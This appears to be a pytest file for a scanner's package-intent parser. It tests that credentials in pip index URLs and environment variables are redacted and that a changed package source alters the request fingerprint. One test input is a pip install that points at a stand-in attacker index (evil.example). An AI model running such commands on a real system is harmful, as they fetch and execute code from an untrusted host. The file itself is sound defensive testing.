"""Phase 12 Python manifest and lockfile parsing tests."""

from __future__ import annotations

import pytest

from codex_plugin_scanner.guard.runtime.package_intent_common import build_package_request_artifact
from codex_plugin_scanner.guard.runtime.package_intent_parser import parse_package_intent


@pytest.fixture(autouse=True)
def _native_package_intent(package_intent_native):
    """Parse intents through the resident authority."""

    return package_intent_native


def test_parse_package_intent_redacts_pip_index_credentials_from_flag_values() -> None:
    intent = parse_package_intent(
        "pip install --index-url=https://user:secret@example.com/simple "
        "--extra-index-url=https://token@mirror.example/simple requests==2.31.0"
    )

    assert intent is not None
    assert "user:secret@" not in intent.redacted_command
    assert "token@" not in intent.redacted_command
    assert "example.com" not in intent.redacted_command
    assert "mirror.example" not in intent.redacted_command


def test_parse_package_intent_redacts_pip_index_credentials_from_env_assignments() -> None:
    intent = parse_package_intent("PIP_INDEX_URL=https://user:secret@example.com/simple pip install requests==2.31.0")
    wrapped_intent = parse_package_intent(
        "env PIP_INDEX_URL=https://user:secret@example.com/simple pip install requests==2.31.0"
    )

    assert intent is not None
    assert "user:secret@" not in intent.redacted_command
    assert "example.com" not in intent.redacted_command
    assert wrapped_intent is not None
    assert "user:secret@" not in wrapped_intent.redacted_command
    assert "example.com" not in wrapped_intent.redacted_command


def test_parse_package_intent_package_source_env_changes_fingerprint() -> None:
    benign_intent = parse_package_intent("pip install requests==2.31.0")
    source_intent = parse_package_intent(
        "PIP_INDEX_URL=https://user:secret@evil.example/simple pip install requests==2.31.0"
    )
    unrelated_env_intent = parse_package_intent("API_TOKEN=supersecret pip install requests==2.31.0")

    assert benign_intent is not None
    assert source_intent is not None
    assert unrelated_env_intent is not None
    assert "user:secret@" not in source_intent.redacted_command
    assert "evil.example" not in source_intent.redacted_command

    benign_artifact = build_package_request_artifact(
        "codex",
        benign_intent,
        config_path="guard.toml",
        source_scope="project",
    )
    source_artifact = build_package_request_artifact(
        "codex",
        source_intent,
        config_path="guard.toml",
        source_scope="project",
    )
    unrelated_env_artifact = build_package_request_artifact(
        "codex",
        unrelated_env_intent,
        config_path="guard.toml",
        source_scope="project",
    )

    assert source_artifact.artifact_id != benign_artifact.artifact_id
    assert unrelated_env_artifact.artifact_id == benign_artifact.artifact_id


def test_parse_package_intent_strips_non_url_env_assignments_from_redacted_command() -> None:
    intent = parse_package_intent("API_TOKEN=supersecret pip install requests==2.31.0")

    assert intent is not None
    assert "API_TOKEN" not in intent.redacted_command
    assert "supersecret" not in intent.redacted_command
    assert intent.redacted_command == "pip install requests==2.31.0"
